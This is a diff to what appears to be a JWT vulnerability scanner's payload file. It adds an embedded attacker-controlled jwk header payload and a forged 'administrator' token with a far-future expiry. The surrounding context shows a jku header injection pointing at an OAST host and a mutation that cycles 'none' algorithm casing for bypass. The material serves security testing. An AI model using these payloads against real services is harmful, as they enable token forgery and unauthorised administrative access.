@@ -26,6 +26,14 @@ payloads:
     template: '{{"alg":"RS256","jku":"https://{oast_host}/jwks.json","kid":"{canary}"}}'
     confidence: suspected
     notes: jku header injection; points key server at OAST-controlled JWKS endpoint.
+  - id: jwk_embedded_key_injection
+    template: '{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"{canary}","e":"AQAB"}}'
+    confidence: suspected
+    notes: Embedded attacker-controlled jwk header; signed with matching private key, tests trust-without-allowlist verifiers.
+  - id: exp_nbf_far_future
+    template: '{"sub":"administrator","nbf":1000000000,"exp":4102444800}'
+    confidence: suspected
+    notes: nbf in the past / exp far in the future; tests weak or absent time-claim enforcement combined with a forged identity.
 mutations:
   - name: case_flip
     description: Cycle none/None/NONE/nOnE casing variants of the alg value for bypass.
